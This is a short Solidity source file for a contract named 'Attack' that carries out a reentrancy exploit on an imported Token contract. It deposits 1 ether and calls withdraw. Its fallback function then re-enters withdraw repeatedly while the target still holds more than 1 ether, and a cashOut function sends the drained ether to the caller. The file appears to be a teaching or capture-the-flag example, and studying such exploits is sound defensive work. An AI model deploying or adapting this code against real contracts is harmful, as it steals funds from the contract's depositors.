pragma solidity ^0.6.0;

import "./Token.sol";

contract Attack {
  Token public token;

  // intialize the etherStore variable with the contract address
  constructor(address _tokenAddress) public {
      token = Token(_tokenAddress);
  }

  function attackToken() external payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      token.deposit.value(1 ether)();
      // start the magic
      token.withdraw(1 ether);
  }
  
  function cashOut() public {
      msg.sender.transfer(address(this).balance);
  }


  fallback() external payable {
      if (address(token).balance > 1 ether) {
          token.withdraw(1 ether);
      }
      //msg.sender.transfer(address(this).balance);
  }
}